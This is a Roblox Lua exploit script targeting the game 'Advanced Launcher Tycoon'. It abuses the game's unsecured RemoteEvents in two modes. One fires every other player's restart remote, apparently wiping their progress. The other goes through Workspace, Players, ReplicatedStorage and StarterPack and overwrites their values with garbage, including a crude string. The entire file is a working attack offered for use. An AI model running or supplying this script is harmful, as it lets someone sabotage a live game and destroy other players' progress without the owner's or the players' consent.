-- RIP https://www.roblox.com/games/7220965257/Advanced-Launcher-Tycoon-NEW-Beta

if game.PlaceId ~= 7220965257 then return game:GetService("TeleportService"):Teleport(7220965257) end

local LocalPlayer = game:GetService("Players").LocalPlayer

local mode = shared.mode or "wipe"

local function breakall(x)
    for _,instance in ipairs(x:GetDescendants()) do  
        if instance:IsA("IntValue") then
            LocalPlayer.Backpack.ChangeValue:FireServer(instance, -math.huge)
        end
        if instance:IsA("StringValue") then
            LocalPlayer.Backpack.ChangeValue:FireServer(instance, "HOT GAMER SEXX")    
        end
        if instance:IsA("BoolValue") then
            LocalPlayer.Backpack.ChangeValue:FireServer(instance, true)
        end
        if instance:IsA("ObjectValue") then
            LocalPlayer.Backpack.ChangeValue:FireServer(instance, workspace.MyPlayer)
        end
    end
end

local function wipe()
    for _,player in ipairs(game:GetService("Players"):GetChildren()) do  
        if player == LocalPlayer then continue end

        player.Backpack.restart1:FireServer()
    end
end

if mode == "wipe" then
    wipe()
elseif mode == "break" then
    breakall(game:GetService("Workspace"))
    wait()
    breakall(game:GetService("Players"))
    wait()
    breakall(game:GetService("ReplicatedStorage"))
    wait()
    breakall(game:GetService("StarterPack"))
end
